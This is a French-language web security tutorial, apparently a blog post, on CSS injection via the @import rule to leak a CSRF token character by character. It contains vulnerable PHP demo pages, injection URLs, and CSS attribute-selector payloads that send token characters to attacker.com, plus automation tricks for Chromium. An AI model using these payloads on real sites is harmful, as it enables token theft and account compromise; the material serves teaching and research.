---
description: 15 Décembre 2022
---

# Les injections CSS - Partie 3

## Utilisation de la règle @import

La règle CSS `@import` permet d'importer des règles CSS en référençant d'autres feuilles de styles. Pour fonctionner, la règle `@import` doit être déclarée avant toutes les autres règles CSS (à l'exception de la règle `@charset`). L'import d'une feuille de style s'effectue comme ceci :&#x20;

{% code overflow="wrap" %}
```css
@import url("https://example.com/styles/style.css");
```
{% endcode %}

Par exemple, le navigateur appliquant le style suivant n'effectuera pas l'import :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  h1 {
    color: red;
  }
      
  @import url("https://example.com/styles/style.css");
</style>
```
{% endcode %}

Ce qui rend donc impossible son utilisation lors des injections déjà vues dans les exemples précédents :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - utilisation impossible de la règle CSS @import</h1>
  </body>
</html>
```
{% endcode %}

C'est donc le code suivant qui sera utilisé pour illustrer l'utilisation de la règle `@import` dans une injection CSS :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      <?php echo htmlspecialchars($_GET['css'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
    </style>
  </head>
  <body>
    <h1>Injection CSS - utilisation de la règle CSS @import</h1>
    <form action="" method="POST">
        <input type="password" name="newPassword" placeholder="New Password">
        <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
        <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
        <input type="submit" name="changePassword" value="Continue">
    </form>
  </body>
</html>
```
{% endcode %}

L'injection permettant d'importer une feuille de style contrôlée par l'attaquant étant la suivante :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/style.css)
```
{% endcode %}

Lorsque la victime visite la page injectée, son navigateur effectue la requête permettant de charger la feuille de style importée :&#x20;

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

En admettant que le contenu de la feuille de style malicieuse n'effectue seulement qu'un changement de couleur du titre :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
h1 {
  color: red;
}
```
{% endcode %}

La victime verra donc ainsi l'application du style CSS :&#x20;

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Pour l'attaquant, l'idée ici sera d'utiliser la feuille de style CSS sous son contrôle afin d'exécuter les attaques vues précédemment, mais sans avoir besoin d'iframer le site vulnérable ou de passer plusieurs fois des liens malicieux à sa victime (un premier lien pour identifier le premier caractère, un second lien pour le second caractère, etc).

### @import et sélecteurs d'attributs

Il est possible d'utiliser la règle `@import` afin de récupérer la valeur d'un attribut HTML, comme déjà vu dans la première partie. L'attaquant va tout d'abord créer la page d'instructions CSS suivante :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
input[name=csrf-token][value^=a]~* {
  background-image:url(https://attacker.com/?leak=a);
}

input[name=csrf-token][value^=b]~* {
  background-image:url(https://attacker.com/?leak=b);
}

input[name=csrf-token][value^=c]~* {
  background-image:url(https://attacker.com/?leak=c);
}

...

input[name=csrf-token][value^=z]~* {
  background-image:url(https://attacker.com/?leak=z);
}
```
{% endcode %}

Puis, fournir le lien exploitant l'injection à sa victime :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/style.css)
```
{% endcode %}

Une fois le premier caractère connu, il forgera une nouvelle feuille de style puis tentera de tromper à nouveau sa victime. Soit, en admettant que le premier caractère récupéré est `c` :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
input[name=csrf-token][value^=ca]~* {
  background-image:url(https://attacker.com/?leak=ca);
}

input[name=csrf-token][value^=cb]~* {
  background-image:url(https://attacker.com/?leak=cb);
}

input[name=csrf-token][value^=cc]~* {
  background-image:url(https://attacker.com/?leak=cc);
}

...

input[name=csrf-token][value^=cz]~* {
  background-image:url(https://attacker.com/?leak=cz);
}
```
{% endcode %}

{% code overflow="wrap" %}
```
https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/style-second-char.css)
```
{% endcode %}

Il n'y a en fait pas réellement de différence avec la première méthode, excepté que l'attaquant n'est plus contraint par la taille de l'URL.

{% hint style="info" %}
Avec la première méthode, le paramètre `GET` contenait toutes les instructions CSS permettant de connaitre le caractère ciblé. L'URL pouvait donc parfois dépasser la taille autorisée et, dans ce cas, nécessitait de découper la payload en plus petites parties.
{% endhint %}

L'intérêt réel de cette mécanique devient surtout visible lors de son automatisation.

### Automatisation de l'exploitation utilisant la règle @import

Le principe de l'automatisation de l'exploitation est le suivant :&#x20;

1. L'attaquant va soumettre une URL à sa victime (comme c'est déjà le cas pour l'exploitation manuelle)
2. L'appel va entrainer la génération d'une feuille CSS à la volée par le serveur de l'attaquant de la façon suivante :&#x20;
   1. un import récursif
   2. des sélecteurs d'attribut CSS permettant de faire fuiter un des caractères de l'information
   3. un sélecteur d'attribut CSS prenant en compte tous les caractères connus par l'attaquant afin de savoir quand stopper l'attaque

Soit le diagramme suivant (se répétant jusqu'à ce que la totalité du jeton soit récupéré) :&#x20;

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

En théorie cela fonctionne, mais en pratique, plusieurs problématiques restent à régler avec que cela fonctionne.

#### Directive d'import bloquante

L'import de la première feuille de style va permettre de récupérer le caractère `n` de l'information à récupérer (grâce aux sélecteurs CSS) mais également d'importer la prochaine feuille de style (qui permettra la récupération le caractère `n+1` et ainsi de suite) :

{% code overflow="wrap" lineNumbers="true" %}
```css
/* La page à importer sera générée une fois le premier caractère récupéré */
@import url("https://attacker.com/styles/recursive_style.css");

/* Les sélecteurs doivent être appliqués avant la récupération de l'import */
input[name=csrf-token][value^=a]~* {
  background-image:url(https://attacker.com/?leak=a);
}

input[name=csrf-token][value^=b]~* {
  background-image:url(https://attacker.com/?leak=b);
}
```
{% endcode %}

Il est donc nécessaire que le serveur de l'attaquant récupère le caractère avant de générer la nouvelle feuille CSS, bloquant ainsi l'import. Il faut donc que le navigateur, en attendant la réponse de l'import, applique les autres règles CSS présentes dans le fichier (permettant ici de faire fuiter un des caractères).

Seuls les navigateurs basés sur Chromium fonctionne de la sorte. Firefox par exemple, va bloquer à l'import et se mettre en attente de la nouvelle feuille CSS sans jamais appliquer les sélecteurs CSS présents déclarés dans la feuille. Ce qui aura pour conséquence de ne pas faire fuiter le caractère nécessaire à la génération de la feuille de l'import, faisant ainsi tomber le navigateur dans une boucle infinie.

#### Multiple application d'un style CSS à un élément

Afin de gagner en performance, si plusieurs règles CSS ciblent le même élément, alors une seule de ces règles sera appliquée. Par exemple :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
h1 {
  background: url(https://example.com/images/background1.png);
}

h1 {
  background: url(https://example.com/images/background2.png);
}
```
{% endcode %}

Ici seul le `background2.png` sera appliqué. Mais ce n'est pas tout, car seul l'URL `https://example.com/images/background2.png` sera appelée, la première règle CSS sera donc complètement ignorée.

Cela va poser problème dans le cadre de l'automatisation. Lors de l'application de la première feuille de style, le sélecteur CSS du premier caractère sera appliqué (en admettant que le premier caractère est un `h`) :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
input[name=csrf-token][value^=h]~* {
  background-image:url(https://attacker.com/?leak=h);
}
```
{% endcode %}

Mais la règle (présente dans le prochain import) ciblant le même élément sera alors ignorée ne faisant ainsi pas fuiter le second caractère :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
input[name=csrf-token][value^=h2]~* {
  background-image:url(https://attacker.com/?leak=h2);
}
```
{% endcode %}

Ici, la solution est d'utiliser la pseudo-class `:first-child` autant de fois que nécessaire de la façon suivante :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
/* Première feuille CSS */
input[name=csrf-token][value^=h]~*:first-child {
  background-image:url(https://attacker.com/?leak=h);
}

/* Seconde feuille CSS */
input[name=csrf-token][value^=h2]~*:first-child:first-child {
  background-image:url(https://attacker.com/?leak=h2);
}

/* Seconde feuille CSS */
input[name=csrf-token][value^=h2A]~*:first-child:first-child:first-child {
  background-image:url(https://attacker.com/?leak=h2A);
}

/* etc */
```
{% endcode %}

Cela ajoute une autre problématique. L'utilisation des sélecteurs `~*` ne semble pas compatibles avec l'utilisation d'une pseudo-class comme `:first-child`. Etant donné que seuls les navigateurs basés sur Chromium sont de toute façon exploitables, il est possible d'utiliser à la place la pseudo-class `has()` :&#x20;

<pre class="language-css" data-overflow="wrap" data-line-numbers><code class="lang-css">/* Première feuille CSS */
has(input[name=csrf-token][value^=h]):first-child {
  background-image:url(https://attacker.com/?leak=h);
}

/* Seconde feuille CSS */
has(input[name=csrf-token][value^=h2]):first-child:first-child {
  background-image:url(https://attacker.com/?leak=h2);
}

/* Seconde feuille CSS */
<strong>has(input[name=csrf-token][value^=h2A]):first-child:first-child:first-child {
</strong>  background-image:url(https://attacker.com/?leak=h2A);
}

/* etc */
</code></pre>

> Si quelqu'un identifie la possibilité d'utiliser les sélecteurs `~*` avec la pseudo-class `:first-child`, qu'il n'hésite pas à me contacter par mail ou sur mon Twitter :)

#### Position de l'injection

La position de l'injection semble avoir une incidence sur le bon déroulement de l'exploitation. Si le point d'injection se situe après l'élément ciblé, alors, l'attaque se déroule rapidement et sans encombre :&#x20;

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>
    <h1>Injection CSS - utilisation de la règle CSS @import</h1>
    <form action="" method="POST">
        <input type="password" name="newPassword" placeholder="New Password">
        <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
        <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
        <input type="submit" name="changePassword" value="Continue">
    </form>
    <style>
      <!-- Point d'injection après l'élément à récuperer -->
      <?php echo htmlspecialchars($_GET['css'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
    </style>
  </body>
</html>
```

Dans le cas contraire, la récupération sera soit très lente voir même bloquée, excepté si la victime effectue des clics sur la page injectée :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      <!-- Point d'injection avant l'élément à récuperer -->
      <?php echo htmlspecialchars($_GET['css'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
    </style>
  </head>
  <body>
    <h1>Injection CSS - utilisation de la règle CSS @import</h1>
    <form action="" method="POST">
        <input type="password" name="newPassword" placeholder="New Password">
        <input type="password" name="confirmNewPassword" placeholder="Confirm New Password">
        <input type="hidden" name="csrf-token" value="a5ccef6a-1f00-4a02-b16b-e4e9e517b223">
        <input type="submit" name="changePassword" value="Continue">
    </form>
  </body>
</html>
```
{% endcode %}

{% hint style="info" %}
Le mieux reste encore de tester soi-même l'automatisation pour bien se rendre compte de ces difficultés.
{% endhint %}

Le PoC est disponible [ici](https://github.com/Sharpforce/PoC-CSS-injection/tree/master/has-attribute-selectors-import).
